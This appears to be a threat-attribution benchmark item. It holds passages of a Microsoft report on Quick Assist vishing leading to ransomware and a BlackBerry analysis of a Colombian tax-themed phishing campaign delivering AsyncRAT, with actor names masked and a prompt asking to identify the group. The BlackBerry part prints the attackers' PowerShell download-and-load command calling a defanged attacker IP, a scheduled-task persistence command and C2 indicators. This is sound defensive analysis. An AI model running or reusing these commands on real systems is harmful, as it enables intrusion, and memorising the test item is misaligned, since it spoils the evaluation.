for Endpoint detects components of activity originating from Quick Assist sessions as well as follow-on activity, and Microsoft Defender Antivirus detects the malware components associated with this activity.    TECH SUPPORT SCAMS    Report scam   Organizations can also reduce the risk of attacks by blocking or uninstalling Quick Assist and other remote management tools if the tools are not in use in their environment. Quick Assist is installed by default on devices running Windows 11. Additionally, tech support scams are an industry-wide issue where scammers use scare tactics to trick users into unnecessary technical support services. Educating users on how to recognize such scams can significantly reduce the impact of social engineering attacks.     Social engineering  One of the social engineering techniques used by threat actors to obtain initial access to target devices using Quick Assist is through vishing attacks. Vishing attacks are a form of social engineering that involves callers luring targets into revealing sensitive information under false pretenses or tricking targets into carrying out actions on behalf of the caller.    For example, threat actors might attempt to impersonate IT or help desk personnel, pretending to conduct generic fixes on a device. In other cases, threat actors initiate link listing attacks – a type of email bombing attack, where threat actors sign up targeted emails to multiple email subscription services to flood email addresses indirectly with subscribed content. Following the email flood, the threat actor impersonates IT support through phone calls to the target user, claiming to offer assistance in remediating the spam issue.    At the end of May 2024, Microsoft observed [PLACEHOLDER] using Microsoft Teams to send messages to target users in addition to phone calls. Tenants created by the threat actor are used to impersonate help desk personnel with names displayed as “Help Desk”, “Help Desk IT”, “Help Desk Support”, and “IT Support”. Microsoft has taken action to mitigate this by suspending identified accounts and tenants associated with inauthentic behavior. Apply security best practices for Microsoft Teams to safeguard Teams users.    During the call, the threat actor persuades the user to grant them access to their device through Quick Assist. The target user only needs to press CTRL + Windows + Q and enter the security code provided by the threat actor, as shown in the figure below.    Screenshot of Quick Assist prompt to enter security code  Figure 1. Quick Assist prompt to enter security code  After the target enters the security code, they receive a dialog box asking for permission to allow screen sharing. Selecting Allow shares the user’s screen with the actor.    Screenshot of Quick Assist dialog box asking permission to allow screen sharing  Figure 2. Quick Assist dialog box asking permission to allow screen sharing  Once in the session, the threat actor can select Request Control, which if approved by the target, grants the actor full control of the target’s device.    Screenshot of Quick Assist dialog box asking permission to allow control  Figure 3. Quick Assist dialog box asking permission to allow control  Follow-on activity leading to [PLACEHOLDER] ransomware  Once the user allows access and control, the threat actor runs a scripted cURL command to download a series of batch files or ZIP files used to deliver malicious payloads. Some of the batch scripts observed reference installing fake spam filter updates requiring the targets to provide sign-in credentials. In several cases, Microsoft Threat Intelligence identified such activity leading to the download of Qakbot, RMM tools like ScreenConnect and NetSupport Manager, and Cobalt Strike.    Screenshot of two lines of cURL commands  Figure 4. Examples of cURL commands to download batch files and ZIP files  Qakbot has been used over the years as a remote access vector to deliver additional malicious payloads that led to ransomware deployment. In this recent activity, Qakbot was used to deliver a Cobalt Strike Beacon attributed to [PLACEHOLDER].    ScreenConnect was used to establish persistence and conduct lateral movement within the compromised environment. NetSupport Manager is a remote access tool used by multiple threat actors to maintain control over compromised devices. An attacker might use this tool to remotely access the device, download and install additional malware, and launch arbitrary commands.    The mentioned RMM tools are commonly used by threat actors because of their extensive capabilities and ability to blend in with the environment. In some cases, the actors leveraged the OpenSSH tunneling tool to establish a secure shell (SSH) tunnel for persistence.     After the threat actor installs the initial tooling and the phone call is concluded, [PLACEHOLDER] leverages their access and performs further hands-on-keyboard activities such as domain enumeration and lateral movement.    In cases where [PLACEHOLDER] relies on Teams messages followed by phone calls and remote access through Quick Assist, the threat actor uses BITSAdmin to download batch files and ZIP files from a malicious site, for example antispam3[.]com. [PLACEHOLDER] also provides the target user with malicious links that redirect the user to an EvilProxy phishing site to input credentials. EvilProxy is an adversary-in-the-middle (AiTM) phishing kit used to capture passwords, hijack a user’s sign-in session, and skip the authentication process. [PLACEHOLDER] was also observed deploying SystemBC, a post-compromise commodity remote access trojan (RAT) and proxy tool typically used to establish command-and-control communication, establish persistence in a compromised environment, and deploy follow-on malware, notably ransomware.    In several cases, [PLACEHOLDER] uses PsExec to deploy [PLACEHOLDER] ransomware throughout the network. [PLACEHOLDER] is a closed ransomware offering (exclusive and not openly marketed like ransomware as a service) distributed by a small number of threat actors who typically rely on other threat actors for initial access, malicious infrastructure, and malware development. Since [PLACEHOLDER] first appeared in April 2022, [PLACEHOLDER] attackers have deployed the ransomware after receiving access from Qakbot and other malware distributors, highlighting the need for organizations to focus on attack stages prior to ransomware deployment to reduce the threat. In the next sections, we share recommendations for improving defenses against this threat, including best practices when using Quick Assist and mitigations for reducing the impact of [PLACEHOLDER] and other ransomware.    Recommendations  Microsoft recommends the following best practices to protect users and organizations from attacks and threat actors that misuse Quick Assist:    Consider blocking or uninstalling Quick Assist and other remote monitoring and management tools if these tools are not in use in your environment. If your organization utilizes another remote support tool such as Remote Help, block or remove Quick Assist as a best practice. Remote Help is part of the Microsoft Intune Suite and provides authentication and security controls for helpdesk connections.  Educate users about protecting themselves from tech support scams. Tech support scams are an industry-wide issue where scammers use scary tactics to trick users into unnecessary technical support services.  Only allow a helper to connect to your device using Quick Assist if you initiated the interaction by contacting Microsoft Support or your IT support staff directly. Don’t provide access to anyone claiming to have an urgent need to access your device.  If you suspect that the person connecting to your device is conducting malicious activity, disconnect from the session immediately and report to your local authorities and/or any relevant IT members within your organization.  Users who have been affected by a tech support scam can also use the Microsoft technical support scam form to report it.  Microsoft recommends the following mitigations to reduce the impact of this threat:    Educate users about protecting personal and business information in social media, filtering unsolicited communication, identifying lure links in phishing emails, and reporting reconnaissance attempts and other suspicious activity.  Educate users about preventing malware infections, such as ignoring or deleting unsolicited and unexpected emails or attachments sent through instant messaging applications or social networks as well as suspicious phone calls.  Invest in advanced anti-phishing solutions that monitor incoming emails and visited websites. Microsoft Defender for Office 365 brings together incident and alert management across email, devices, and identities, centralizing investigations for email-based threats.  Educate Microsoft Teams users to verify ‘External’ tagging on communication attempts from external entities, be cautious about what they share, and never share their account information or authorize sign-in requests over chat.  Implement Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps.  Apply Microsoft’s security best practices for Microsoft Teams to safeguard Teams users.  Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.  Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.  Turn on tamper protection features to prevent attackers from stopping security services.  Enable investigation and remediation in full automated mode to allow Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.  Refer to Microsoft’s human-operated ransomware overview for general hardening recommendations against ransomware attacks.  Microsoft Defender XDR customers can turn on attack surface reduction rules to prevent common attack techniques:    Block executable files from running unless they meet a prevalence, age, or trusted list criterion  Block execution of potentially obfuscated scripts  Block process creations originating from PSExec and WMI commands  Use advanced protection against ransomware  Detection details  Microsoft Defender Antivirus   Microsoft Defender Antivirus detects Qakbot downloaders, implants, and behavior as the following malware:    TrojanDownloader:O97M/Qakbot  Trojan:Win32/QBot  Trojan:Win32/Qakbot  TrojanSpy:Win32/Qakbot  Behavior:Win32/Qakbot  [PLACEHOLDER] threat components are detected as the following:    Behavior:Win32/Basta  Ransom:Win32/Basta  Trojan:Win32/Basta  Microsoft Defender Antivirus detects Beacon running on a victim process as the following:    Behavior:Win32/CobaltStrike  Backdoor:Win64/CobaltStrike  HackTool:Win64/CobaltStrike  Additional Cobalt Strike components are detected as the following:    TrojanDropper:PowerShell/Cobacis  Trojan:Win64/TurtleLoader.CS  Exploit:Win32/ShellCode.BN  SystemBC components are detected as:    Behavior:Win32/SystemBC  Trojan: Win32/SystemBC  Microsoft Defender for Endpoint  Alerts with the following title in the security center can indicate threat activity on your network:    Suspicious activity using Quick Assist  The following alerts might also indicate activity related to this threat. Note, however, that these alerts can also be triggered by unrelated threat activity.    Suspicious curl behavior  Suspicious bitsadmin activity  Suspicious file creation by BITSAdmin tool  A file or network connection related to a ransomware-linked emerging threat activity group detected —This alert captures [PLACEHOLDER] activity  Ransomware-linked emerging threat activity group Storm-0303 detected — This alert captures some Qakbot distributor activity  Possible Qakbot activity  Possible NetSupport Manager activity  Possibly malicious use of proxy or tunneling tool  Suspicious usage of remote management software  Ongoing hands-on-keyboard attacker activity detected (Cobalt Strike)  Human-operated attack using Cobalt Strike  Human-operated attack implant tool detected  Ransomware behavior detected in the file system
https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia	[PLACEHOLDER] has been actively targeting organizations in Colombia and Ecuador since at least 2019. It relies on spear-phishing emails sent to specific and strategic companies to conduct its campaigns. On Feb. 20, the BlackBerry Research and Intelligence team witnessed a new campaign where the threat actor impersonated a Colombian government tax agency to target key industries in Colombia, including health, financial, law enforcement, immigration, and an agency in charge of peace negotiation in the country.    Based on the infector vector and payload deployment mechanism, we also uncovered campaigns targeting Ecuador, Chile, and Spain.    Brief MITRE ATT&CK Information  Tactic    Technique    Initial Access    T1566.001    Execution    T1204.001, T1204.002, T1059.005, T1059.001, T1059.003    Persistence    T1053.005, T1547.001    Defense Evasion    T1218.009      Weaponization and Technical Overview  Weapons    PDF for lures, Visual Basic Scripts, .NET Assemblies injected in memory, Malicious DLLs, PowerShell    Attack Vector    Spear-phishing attachment with PDF    Network Infrastructure    DDNS DuckDNS, Discord, Web Applications    Targets    Entities in Colombia      Technical Analysis  Context    [PLACEHOLDER] is a South American cyber espionage group that has been actively targeting Latin America-based entities over the last few years. Although most of its efforts have been focused on Colombia, according to research conducted by CheckPoint researchers, it has also carried out intrusions against Ecuador.    The main targets of this group for the last few years have been those related to financial and governmental entities.    The initial vector for infection is typically a PDF attachment sent by email. In the case we’ll be examining in this report, the sender of the phishing email opted to use the Blind Carbon Copy (BCC) field instead of the To: field, most likely in an attempt to evade spam filters. They orchestrated their scam to correspondencia@ccb.org.co, which is the official email address listed on the Contact Us page of the Bogota Chamber of Commerce website. Bogotá, of course, is the Capital of Colombia.    The email's Subject line reads, "Obligaciones pendientes - DIAN N.2023-6980070- 39898001" - in English, this means “outstanding obligations,” a lure craftily designed to catch the attention of unsuspecting law-abiding recipients. DIAN is Colombia’s Directorate of National Taxes and Customs - the Dirección de Impuestos y Aduanas Nacionales.    The letter we analyzed states that the recipient is “45 days in arrears” with a tax payment, and tells the target to click a link to view their invoice, which comes in the form of a password-protected PDF. The letter was signed by a (likely fictious) “Roberto Mendoza Ortiz, Department Head.” The phishing email's sender is "alfredo agudelo moreno agudelomorenoalfredo79[at]gmail[.]com," an email address which also appears to have been be made up specifically for this campaign.    We also found another email address associated with this campaign – cobrofactura09291[at]gmail[.]com.    The PDF attached to the phishing email tries to trick the recipient with logos and messages related to the Directorate of National Taxes and Customs. [PLACEHOLDER] has regularly used DIAN in their spear-phishing lures over the years, presumably hoping that their targets’ wish to maintain in good standing with the tax authorities would override any natural caution they may have when opening emails sent from an unfamiliar email address.    The PDF contains a URL different from the legitimate hyperlink to DIAN’s website, which is https://www.dian.gov.co/. The URL shown is the real one; however, if the user clicks on it, they are redirected to a different website. Finally, the URL field of this new site contains a URL which downloads a second-stage payload from the public service Discord.    Below is the full intrusion attempt shown step-by-step:      Figure 1: Attack flow of [PLACEHOLDER]’s campaign analyzed    Attack Vector  Hashes (md5, sha-256)    e4d2799f3001a531d15939b1898399b4    fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554    File name    Fv3608799004720042L900483000P19878099700001537012.pdf    File Size    507436 bytes    Created    2023:01:25 10:07:03-05:00    Author    Dirección De Aduanas Nacionales Calle 23 # 157-25 la    Last Modified    2023:01:25 10:07:03-05:00    DocumentID    uuid:9585FD65-6D08-453D-9E4A-51155AD12748      What is the DIAN?  The Directorate of National Taxes and Customs is an entity attached to the Ministry of Finance and Public Credit. The DIAN is organized as a Special Administrative Unit of the national order. Its purpose is to help guarantee the fiscal security of the Colombian State and the protection of the national economic public order through the administration and control of due compliance with tax, customs, and exchange obligations. The jurisdiction of the DIAN includes the national territory. It is headquartered in Bogotá, the Capital of Colombia.    Weaponization  [PLACEHOLDER] carefully targets its victims with spear-phishing emails, in a similar fashion to other campaigns by the group. It entices its targets to click links contained in the body of the email, or to download a malicious PDF file, which purports to contain information about overdue taxes.    The URL shown on the bait document masquerades as the actual domain of DIAN. However, when clicked, the hyperlink leads to another domain created entirely by the threat actor using the public service website[.]org. The link redirects the target to dian.server[.]tl. This crafty technique is known as URL phishing.      Figure 2: Content of the bait email, masquerading as the Directorate of National Taxes and Customs    In English, the bait document reads:    Dear taxpayer,    At DIAN we maintain our commitment to provide you with the necessary assistance and services so that you can comply in a timely and correct manner with your tax obligations.    For this reason, we remind you that you are in arrears with your obligations. for an amount owed of THREE MILLION TWO HUNDRED FIFTY-TWO THOUSAND ONE HUNDRED FORTY PESOS, with 45 days in arrears due to the lack of commitment in your financial obligations regulated in law 0248 of the year 2005 numeral 12.    Next, we put at your disposal the Virtual PDF with all the details of your obligations generated to date.    Submit a foreclosure process and pay on time.    In the following link you will find the invoice in PDF format.    To view the document, enter the password: A2023    Cordially,    ROBERTO MENDOZA ORTIZ  Department Head      When the victim clicks on the masked link in the email, they are redirected to dian.server[.]tl. The threat actor carefully crafted this webpage to deceive the victim into believing they are interacting with the real DIAN.      Figure 3: Content presented to the user on the fake webpage dian.server[.]tl    Looking at the code of the webpage, the content presented to the users is loaded from website[.]org/s8Xwt2 or website[.]org/render/s8Xwt2, and not from dian.server[.]tl. This is accomplished by using an iframe resized to the 100% of the screen.      Figure 4: The content the victim sees is shown on the left, which is loaded from the resource shown on the right    The fake DIAN website page contains a button that encourages the victim to download a PDF to view what the site claims to be pending tax invoices. Clicking the blue button initiates the download of a malicious file from the Discord content delivery network (CDN), which the attackers are abusing in this phishing scam.    hxxps://cdn.discordapp[.]com/attachments/1067819339090243727/1071063499494666240/Asuntos_DIAN_N34000137L287004P08899997012-03-02-2023-pdf[.]uue  hxxps://cdn.discordapp[.]com/attachments/1066009888083431506/1070342535702130759/Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf[.]uue  hxxps://cdn.discordapp[.]com/attachments/1072851594812600351/1072851643583967272/Asuntos_DIAN_N3663000227L2870000002456880-08-02-2023-pdf[.]uue  The downloaded file tries to trick the user into manually adding the word “pdf” at the end of the filename. However, the real extension is actually “uue.” This is a file extension WinRAR opens by default. Behind the extension there is a .RAR archive.    Figure 5: Default installation of WinRAR with uue extension      Hashes (md5, sha-256)    B432202CF7F00B4A4CBE377C284F3F28    6D9D0EB5E8E69FFE9914C63676D293DA1B7D3B7B9F3D2C8035ABE0A3DE8B9FCA    File Name    Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf.uue    File Size    1941 (bytes)      It’s necessary to decompress the contents of the .uue file to continue with the infection chain. The compressed .uue file contains yet another file inside it. The inner file uses the same naming convention as the parent, but in this case, the new file is a Visual Basic Script (VBS).      Figure 6: Content of the malicious .uue file      Hashes (md5, sha-256)    6BEF68F58AFCFDD93943AFCC894F8740    430BE2A37BAC2173CF47CA1376126A3E78A94904DBC5F304576D87F5A17ED366    File name    Asuntos_DIAN_N°6440005403992837L2088970004-01-02-2023-pdf.vbs    File Size    227378 (bytes)    Last Modified    2023:01:31 23:01:04      The file-extracted VBS script is executed via wscript.exe once the user double-clicks the file, so an element of user-interaction is involved in executing the attack. Upon execution, the infection chain starts automatically and carries out various actions within the system without any further user input, as seen below in figure 7.      Figure 7: Process tree once the VBS script is manually executed by the user    The VBS script's content is encoded but easy for a researcher to understand and decode.      Figure 8: Content of the VBS script    The VBS script contains a significant amount of junk code, but has several replace functions to construct the PowerShell execution.      Figure 9: Replace functions to replace junk code by the original behavior    The content was built under the variable “OXVTEUOWQPEFWQ”, as shown in figure 9 above. After creating that content, figure 8 shows the variable “YISMXXAPAUXCGFI”, which is set as a WScript object.    After decoding the code, to better understand its behavior, we can see that a part of the logic - the URL shown in the above image - is actually reversed.      Figure 10: Part of the VBS code decoded       Figure 11: A closer look at part of the VBS code, decoded    The final payload executed is powershell.exe, with the following command line parameters:    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('hxxp://172.174.176[.]153/dll/Dll.ppam'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('Fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('txt.ysa/3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc//:sptth'))  First, PowerShell downloads and executes the decoded base64 content of hxxp://172.174.176[.]153/dll/Dll.ppam, which is a .NET DLL encoded, as shown in figure 12.    Figure 12: Base64 content from the server, called using powershell.exe    Next, it uses GetType(‘Fiber.home’).GetMethod(‘VAI’), to load the VAI method from the DLL downloaded previously. The logic of this method is as follows:    To create a copy of the Visual Basic Script called “Asuntos_DIAN_N°6440005403992837L2088970004-01-02-2023-pdf.vbs” in C:\Windows\Temp\OneDrive.vbs if it already doesn’t exist using PowerShell.  Powershell.exe -WindowStyle Hidden Copy-Item -Path *.vbs -Destination C:\Windows\Temp\OneDrive.vbs  Download the content of hxxp://172.174.176[.]153/rump/Rump.xls (Fsociety)  Replace characters of the content downloaded  Reverse the text of the second URL in the PowerShell command and download its content (hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)  Create a string with the content “C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe”  Load the Fsociety DLL into memory, passing two parameters:  RegSvcs path  AsyncRAT payload  Fsociety DLL loads AsyncRAT in the RegSvcs process using the Process Hollowing technique  To better understand the PowerShell execution, the following image demonstrates the sequence of loading DLLs dynamically in memory until the final goal, which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on the threat landscape today.      Figure 13: Sequence of loaded DLLs after PowerShell execution    The following image is part of all the behavior described above, related to the first DLL loaded using the PowerShell command spawned by the VBS Script and calling the ‘VAI’ method.      Figure 14: Part of the method VAI previously called by PowerShell    As mentioned, Fsociety.dll is used to load the final payload of AsyncRAT, which is downloaded from Discord.    [PLACEHOLDER] mainly uses AsyncRAT, njRAT, QuasarRAT, LimeRAT, and RemcosRAT in its campaigns. A RAT is a remote access tool a network admin may use to remotely administrate the node. So a malicious RAT installed on a victim’s machine enables the threat actor to connect to the infected endpoint any time they like, and to perform any operations they desire.      Figure 15: Fsociety.dll is used to load AsyncRAT in memory    The “Ande” function called in the Fsociety.dll contains the following code:      Figure 16: Fsociety DLL code       Hashes (md5, sha-256)    C75F9D3DA98E57B973077FDE8EC3780F    5399BF1F18AFCC125007D127493082005421C5DDEBC34697313D62D8BC88DAEC    File Name    Fiber.dll (Dll.ppam)    File Size    10240 bytes    Compiled    Thu Feb 02 21:43:24 2023 | UTC         Hashes (md5, sha-256)    07AF8778DE9F2BC53899AAC7AD671A72    03B7D19202F596FE4DC556B7DA818F0F76195912E29D728B14863DDA7B91D9B5    File Name    Fsociety.dll (Rump.xls)    File Size    25600 bytes    Compiled    Sat May 18 00:13:09 2086 | UTC              Hashes (md5, sha-256)    5E518B80C701E17259F3E7323EFFC83F    64A08714BD5D04DA6E2476A46EA620E3F7D2C8A438EDA8110C3F1917D63DFCFC    File Name    Stub.exe (AsyncRAT payload)    File Size    26080 bytes    Compiled    Sun May 10 05:24:51 2020 | UTC      AsyncRAT contains a configuration method with information that is used during the intrusion attempt. This information is encrypted using Base64 and AES256.      Figure 17: AsyncRAT configuration encrypted    Once the configuration is decrypted, it contains information about the Command-and-Control (C2) to transfer commands and files between client and server.      Figure 18: AsyncRAT configuration decrypted    Also, between the configuration, it was possible to obtain the X.509 certificates used for communication with the C2.      Figure 19: Certificate extracted from the AsyncRAT config    AsyncRAT can establish persistence in two different ways, depending on whether a user loaded it with admin privileges or not. A copy of itself is first created under C:\Users\<user>\AppData\Roaming\MRR.exe.      Figure 20: Creation of MRR in AppData folder    1.      If the user who executed it was an admin, then AsyncRAT can create a scheduled task using the process schtasks.exe, with the following command line:    a.      "C:\Windows\System32\cmd.exe" /c schtasks /create /f /sc onlogon /rl highest /tn "MRR" /tr '"C:\Users\<user>\AppData\Roaming\MRR.exe"' & exit'      Figure 21: Execution of schtasks.exe via cmd.exe       Figure 22: Command line executed to create scheduled task and run AsyncRAT    2.      If the user is not an admin, then AsyncRAT can create a registry key to execute the binary every time the system is started:    a.      Key: KCU\Software\Microsoft\Windows\CurrentVersion\Run\MRR  b.      Value: C:\Users\<user>\AppData\Roaming\MRR.exe      Figure 23: Registry key created to execute the AsyncRAT Payload    An interesting part that always happens, regardless of whether the user is admin or not, is the creation of a .bat file in the user’s Temp directory to perform the following actions:    a.      Timeout.exe execution for three seconds  b.      Run the AsyncRAT payload from AppData folder  c.       Delete the .bat file      Figure 24: tmp file creation in the Temp directory      Figure 25: Execution of cmd.exe to load the .bat file from tmp folder    We could determine that the .bat filename is randomly generated using the regular expression after several executions of this sample. The structure is like the next one: .*tmp[a-zA-Z1-9]{4}.tmp.bat.      Figure 26: Persistence methods used by AsyncRAT    Network Infrastructure  In this case, the victim’s machine starts communicating with the DuckDNS server to receive and execute commands, exfiltrate information, and perform any other action desired by the threat actor. As seen in figure 18 above, the server used is asy1543.duckdns[.]org:1543.      Figure 27: Communication started between victim’s machine and the threat actor’s C2    During our investigation, the resolution of the DuckDNS domain was changed to different IP addresses. Initially, the IP that resolves the domain was a VPN/Proxy service 46.246.86[.]3. While conducting the investigation, we discovered another IP with the same purpose, 46.246.12[.]6.    Entity    Value    Description    Domain    asy1543.duckdns[.]org:1543    Final AsyncRAT payload communication domain    IP    46.246.86[.]3    Resolution of the DuckDNS domain    IP    46.246.12[.]6    Resolution of the DuckDNS domain    URL    hxxp://172.174.176[.]153/    Web application hosting payloads used during the infection    IP    172.174.176[.]153    IP of the web application hosting payloads used during the infection      [PLACEHOLDER]/ [PLACEHOLDER] uses Dynamic DNS (DDNS) services, such as DuckDNS, for most campaigns to connect its implemented RATs to the infrastructure they control to send and receive commands. DuckDNS additionally allows for high IP resolution rotation and the launch of new subdomains under this well-known DDNS    The application web hosted under hxxp://172.174.176[.]153/ had two main directories where it stored information to be used during the intrusion as the user downloads and executes files.    The first directory was hxxp://172.174.176[.]153/dll/, storing several DLLs used during the intrusion.      Figure 28: Index of [PLACEHOLDER]'s /dll directory    Another directory is found at hxxp://172.174.176[.]153/rump/ and stores another DLL, in this case, related to Fsociety:      Figure 29: index of /rump directory    Targets  [PLACEHOLDER]/ [PLACEHOLDER]'s targets include health, public, financial, judiciary, and law enforcement entities in Colombia.    Among the countries where we have seen [PLACEHOLDER] activity in the last few months, specifically distributing the UUE file types with different themes, include:    Colombia  Ecuador  Chile  Spain  This is consistent with the use of the Spanish language in the group’s spear-phishing emails. Most countries in South America use Spanish (apart from Brazil), which matches the threat actor’s locale and the names in the bait document.    Attribution  [PLACEHOLDER] is a South American-based threat actor active since at least 2019. The group continues to concentrate its operations within a Hispanic geographic region, with its main targets being government institutions and other organizations primarily based in Colombia.    The use of specific tools and artifacts, along with the type and configuration of the network infrastructure documented in this report, combined with the tactics, techniques & procedures (TTPs) used to deploy them, all closely align with previously attributed campaigns by this group.    That, coupled with the geolocation and nature of the targets seen in this campaign, leads us to ascertain, at the very least, a moderate level of confidence that this campaign was conducted by [PLACEHOLDER].    Conclusions  This campaign continues to operate for the purposes of information theft and espionage. The modus operandi used has mostly stayed the same as the group’s previous efforts – it is very simple, which may mean that this group is comfortable with its way of launching campaigns via phishing emails, and feels confident in using them because they continue to work.    Over the next few months, we will likely continue to see new targets for this group, using new ways to deceive their victims.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER] has been actively targeting organizations in Colombia and Ecuador since at least 2019. It relies on spear-phishing emails sent to specific and strategic companies to conduct its campaigns. On Feb. 20, the BlackBerry Research and Intelligence team witnessed a new campaign where the threat actor impersonated a Colombian government tax agency to target key industries in Colombia, including health, financial, law enforcement, immigration, and an agency in charge of peace negotiation in the country.    Based on the infector vector and payload deployment mechanism, we also uncovered campaigns targeting Ecuador, Chile, and Spain.    Brief MITRE ATT&CK Information  Tactic    Technique    Initial Access    T1566.001    Execution    T1204.001, T1204.002, T1059.005, T1059.001, T1059.003    Persistence    T1053.005, T1547.001    Defense Evasion    T1218.009      Weaponization and Technical Overview  Weapons    PDF for lures, Visual Basic Scripts, .NET Assemblies injected in memory, Malicious DLLs, PowerShell    Attack Vector    Spear-phishing attachment with PDF    Network Infrastructure    DDNS DuckDNS, Discord, Web Applications    Targets    Entities in Colombia      Technical Analysis  Context    [PLACEHOLDER] is a South American cyber espionage group that has been actively targeting Latin America-based entities over the last few years. Although most of its efforts have been focused on Colombia, according to research conducted by CheckPoint researchers, it has also carried out intrusions against Ecuador.    The main targets of this group for the last few years have been those related to financial and governmental entities.    The initial vector for infection is typically a PDF attachment sent by email. In the case we’ll be examining in this report, the sender of the phishing email opted to use the Blind Carbon Copy (BCC) field instead of the To: field, most likely in an attempt to evade spam filters. They orchestrated their scam to correspondencia@ccb.org.co, which is the official email address listed on the Contact Us page of the Bogota Chamber of Commerce website. Bogotá, of course, is the Capital of Colombia.    The email's Subject line reads, "Obligaciones pendientes - DIAN N.2023-6980070- 39898001" - in English, this means “outstanding obligations,” a lure craftily designed to catch the attention of unsuspecting law-abiding recipients. DIAN is Colombia’s Directorate of National Taxes and Customs - the Dirección de Impuestos y Aduanas Nacionales.    The letter we analyzed states that the recipient is “45 days in arrears” with a tax payment, and tells the target to click a link to view their invoice, which comes in the form of a password-protected PDF. The letter was signed by a (likely fictious) “Roberto Mendoza Ortiz, Department Head.” The phishing email's sender is "alfredo agudelo moreno agudelomorenoalfredo79[at]gmail[.]com," an email address which also appears to have been be made up specifically for this campaign.    We also found another email address associated with this campaign – cobrofactura09291[at]gmail[.]com.    The PDF attached to the phishing email tries to trick the recipient with logos and messages related to the Directorate of National Taxes and Customs. [PLACEHOLDER] has regularly used DIAN in their spear-phishing lures over the years, presumably hoping that their targets’ wish to maintain in good standing with the tax authorities would override any natural caution they may have when opening emails sent from an unfamiliar email address.    The PDF contains a URL different from the legitimate hyperlink to DIAN’s website, which is https://www.dian.gov.co/. The URL shown is the real one; however, if the user clicks on it, they are redirected to a different website. Finally, the URL field of this new site contains a URL which downloads a second-stage payload from the public service Discord.    Below is the full intrusion attempt shown step-by-step:      Figure 1: Attack flow of [PLACEHOLDER]’s campaign analyzed    Attack Vector  Hashes (md5, sha-256)    e4d2799f3001a531d15939b1898399b4    fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554    File name    Fv3608799004720042L900483000P19878099700001537012.pdf    File Size    507436 bytes    Created    2023:01:25 10:07:03-05:00    Author    Dirección De Aduanas Nacionales Calle 23 # 157-25 la    Last Modified    2023:01:25 10:07:03-05:00    DocumentID    uuid:9585FD65-6D08-453D-9E4A-51155AD12748      What is the DIAN?  The Directorate of National Taxes and Customs is an entity attached to the Ministry of Finance and Public Credit. The DIAN is organized as a Special Administrative Unit of the national order. Its purpose is to help guarantee the fiscal security of the Colombian State and the protection of the national economic public order through the administration and control of due compliance with tax, customs, and exchange obligations. The jurisdiction of the DIAN includes the national territory. It is headquartered in Bogotá, the Capital of Colombia.    Weaponization  [PLACEHOLDER] carefully targets its victims with spear-phishing emails, in a similar fashion to other campaigns by the group. It entices its targets to click links contained in the body of the email, or to download a malicious PDF file, which purports to contain information about overdue taxes.    The URL shown on the bait document masquerades as the actual domain of DIAN. However, when clicked, the hyperlink leads to another domain created entirely by the threat actor using the public service website[.]org. The link redirects the target to dian.server[.]tl. This crafty technique is known as URL phishing.      Figure 2: Content of the bait email, masquerading as the Directorate of National Taxes and Customs    In English, the bait document reads:    Dear taxpayer,    At DIAN we maintain our commitment to provide you with the necessary assistance and services so that you can comply in a timely and correct manner with your tax obligations.    For this reason, we remind you that you are in arrears with your obligations. for an amount owed of THREE MILLION TWO HUNDRED FIFTY-TWO THOUSAND ONE HUNDRED FORTY PESOS, with 45 days in arrears due to the lack of commitment in your financial obligations regulated in law 0248 of the year 2005 numeral 12.    Next, we put at your disposal the Virtual PDF with all the details of your obligations generated to date.    Submit a foreclosure process and pay on time.    In the following link you will find the invoice in PDF format.    To view the document, enter the password: A2023    Cordially,    ROBERTO MENDOZA ORTIZ  Department Head      When the victim clicks on the masked link in the email, they are redirected to dian.server[.]tl. The threat actor carefully crafted this webpage to deceive the victim into believing they are interacting with the real DIAN.      Figure 3: Content presented to the user on the fake webpage dian.server[.]tl    Looking at the code of the webpage, the content presented to the users is loaded from website[.]org/s8Xwt2 or website[.]org/render/s8Xwt2, and not from dian.server[.]tl. This is accomplished by using an iframe resized to the 100% of the screen.      Figure 4: The content the victim sees is shown on the left, which is loaded from the resource shown on the right    The fake DIAN website page contains a button that encourages the victim to download a PDF to view what the site claims to be pending tax invoices. Clicking the blue button initiates the download of a malicious file from the Discord content delivery network (CDN), which the attackers are abusing in this phishing scam.    hxxps://cdn.discordapp[.]com/attachments/1067819339090243727/1071063499494666240/Asuntos_DIAN_N34000137L287004P08899997012-03-02-2023-pdf[.]uue  hxxps://cdn.discordapp[.]com/attachments/1066009888083431506/1070342535702130759/Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf[.]uue  hxxps://cdn.discordapp[.]com/attachments/1072851594812600351/1072851643583967272/Asuntos_DIAN_N3663000227L2870000002456880-08-02-2023-pdf[.]uue  The downloaded file tries to trick the user into manually adding the word “pdf” at the end of the filename. However, the real extension is actually “uue.” This is a file extension WinRAR opens by default. Behind the extension there is a .RAR archive.    Figure 5: Default installation of WinRAR with uue extension      Hashes (md5, sha-256)    B432202CF7F00B4A4CBE377C284F3F28    